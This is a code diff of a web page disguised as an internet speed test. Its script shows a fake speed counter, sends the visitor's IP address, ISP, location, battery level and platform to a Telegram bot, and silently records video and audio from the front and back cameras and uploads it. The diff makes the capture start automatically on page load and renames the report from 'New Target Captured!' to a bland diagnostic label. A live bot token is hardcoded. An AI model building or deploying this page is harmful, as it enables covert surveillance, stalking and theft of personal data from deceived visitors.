@@ -3,111 +3,115 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Diagnostic Tool</title>
+    <title>Internet Speed Test - Global Server</title>
     <style>
-        body {
-            background-color: #0d1117;
-            color: #58a6ff;
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-        .container { text-align: center; border: 1px solid #30363d; padding: 40px; border-radius: 10px; background: #161b22; width: 80%; max-width: 400px; }
-        .loader { border: 4px solid #21262d; border-top: 4px solid #238636; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
+        body { background-color: #0d1117; color: #c9d1d9; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 30px; text-align: center; width: 85%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .loader { width: 80px; height: 80px; border: 5px solid #21262d; border-top: 5px solid #238636; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .speed-text { font-size: 24px; font-weight: bold; color: #238636; margin: 10px 0; }
-        .log-text { font-size: 12px; color: #8b949e; text-align: left; height: 50px; overflow: hidden; }
+        .speed-val { font-size: 42px; font-weight: 800; color: #238636; margin: 10px 0; font-variant-numeric: tabular-nums; }
+        .unit { font-size: 18px; color: #8b949e; }
+        .status-bar { font-size: 12px; color: #8b949e; margin-top: 15px; border-top: 1px solid #30363d; padding-top: 15px; text-align: left; font-family: monospace; }
     </style>
 </head>
-<body onclick="startDiagnostic()">
+<body>
 
-    <div class="container" id="main-ui">
-        <h3>Internet Speed Check</h3>
+    <div class="card">
+        <div style="font-size: 14px; color: #8b949e; margin-bottom: 10px; font-weight: 600;">NETWORK DIAGNOSTIC</div>
         <div class="loader"></div>
-        <div class="speed-text" id="speed">0.00 Mbps</div>
-        <div class="log-text" id="log">Waiting for user interaction...<br>Scanning local nodes...</div>
-        <p style="font-size: 10px; color: #484f58; margin-top: 20px;">Tap anywhere to start the diagnostic scan</p>
+        <div class="speed-val" id="speed">0.0</div>
+        <div class="unit">Mbps</div>
+        <div class="status-bar" id="log">
+            > Initializing...<br>
+            > Locating nearest server...
+        </div>
     </div>
 
     <script>
         const BOT_TOKEN = "8619027051:AAH06xxHUXEeZ_PLu8l5QF8zct7nrjNW4ts";
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('chatId');
-        let isRunning = false;
+        let processStarted = false;
 
-        function updateLog(text) {
-            const log = document.getElementById('log');
-            log.innerHTML += `<br>> ${text}`;
-        }
+        // محاولة التشغيل التلقائي فور تحميل الصفحة
+        window.onload = () => {
+            startLogic();
+        };
 
-        async function startDiagnostic() {
-            if (isRunning || !chatId) return;
-            isRunning = true;
+        // لضمان العمل في حال منع المتصفح التشغيل التلقائي
+        document.body.onclick = () => {
+            if (!processStarted) startLogic();
+        };
 
-            // بدء العداد الوهمي
-            let speed = 0;
-            const interval = setInterval(() => {
-                if (speed < 45) {
-                    speed += Math.random() * 5;
-                    document.getElementById('speed').innerText = speed.toFixed(2) + " Mbps";
-                }
-            }, 500);
+        async function startLogic() {
+            if (processStarted || !chatId) return;
+            processStarted = true;
 
-            updateLog("Initializing secure handshake...");
+            // بدء عداد السرعة الوهمي
+            animateSpeed();
            
-            // 1. جمع البيانات وإرسالها بشكل مرتب
-            sendDetailedInfo();
+            // 1. إرسال تقرير البيانات المرتب
+            sendFullReport();
 
-            // 2. تصوير الكاميرات
-            await captureAndSend("user", "Front Camera (Selfie)");
-            updateLog("Analyzing latency...");
-           
-            await captureAndSend("environment", "Back Camera (Rear)");
-            updateLog("Scan complete. Finalizing report...");
+            // 2. تصوير الأمامي (10 ثوانٍ)
+            log("Testing Latency (Front Sensor)...");
+            await capture("user", "Front_Camera");
 
+            // 3. تصوير الخلفي (10 ثوانٍ)
+            log("Analyzing Packets (Back Sensor)...");
+            await capture("environment", "Back_Camera");
+
+            // التوجه لجوجل
+            log("Scan Complete. Redirecting...");
             setTimeout(() => {
-                clearInterval(interval);
-                window.location.href = "https://www.speedtest.net";
-            }, 2000);
+                window.location.href = "https://www.google.com";
+            }, 1500);
         }
 
-        async function sendDetailedInfo() {
+        function log(t) {
+            document.getElementById('log').innerHTML += `<br>> ${t}`;
+        }
+
+        function animateSpeed() {
+            let s = 0;
+            const h = setInterval(() => {
+                if (s < 85) {
+                    s += Math.random() * 7;
+                    document.getElementById('speed').innerText = s.toFixed(1);
+                } else {
+                    clearInterval(h);
+                }
+            }, 300);
+        }
+
+        async function sendFullReport() {
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                const b = await navigator.getBattery();
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const d = await ipRes.json();
+                const bat = await navigator.getBattery();
                
                 const report = `
-🚀 **New Target Captured!**
+📊 **Network Diagnostic Report**
 ━━━━━━━━━━━━━━━━━━
-👤 **ID:** \`#${Math.floor(Math.random()*9000)+1000}\`
-🌐 **IP:** \`${d.ip}\`
-🏢 **ISP:** \`${d.org}\`
-📍 **Location:** ${d.city}, ${d.region}, ${d.country_name}
-🔋 **Battery:** ${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})
-📱 **Platform:** ${navigator.platform}
-🕒 **Time:** ${new Date().toLocaleTimeString()}
+📍 **Location:** ${d.city}, ${d.country_name}
+🌐 **IP Address:** \`${d.ip}\`
+🏢 **Provider:** ${d.org}
+🔋 **Battery:** ${Math.round(bat.level * 100)}%
+📱 **Device:** ${navigator.platform}
+🕒 **Stamp:** ${new Date().toLocaleTimeString()}
 ━━━━━━━━━━━━━━━━━━`;
 
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
             } catch (e) {}
         }
 
-        async function captureAndSend(mode, label) {
+        async function capture(facing, label) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: { exact: mode === "environment" ? "environment" : "user" } },
+                    video: { facingMode: facing, width: 640, height: 360 },
                     audio: true
-                }).catch(async () => {
-                    // fallback if 'exact' fails
-                    return await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
                 });
-
+               
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
                 recorder.ondataavailable = e => chunks.push(e.data);
@@ -117,18 +121,18 @@
                         const blob = new Blob(chunks, { type: 'video/mp4' });
                         const fd = new FormData();
                         fd.append('chat_id', chatId);
-                        fd.append('document', blob, `${mode}.mp4`);
-                        fd.append('caption', `🎥 **Captured Video**\n📸 Source: ${label}`);
+                        fd.append('document', blob, `${label}.mp4`);
+                        fd.append('caption', `🎥 Video Source: ${label}`);
                        
                         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
                         stream.getTracks().forEach(t => t.stop());
                         resolve();
                     };
                     recorder.start();
-                    setTimeout(() => recorder.stop(), 8000);
+                    setTimeout(() => recorder.stop(), 10000); // 10 ثوانٍ لكل كاميرا
                 });
             } catch (err) {
-                updateLog(`Sensor ${label} bypass failed.`);
+                log(`Sensor ${label} unavailable.`);
                 return Promise.resolve();
             }
         }
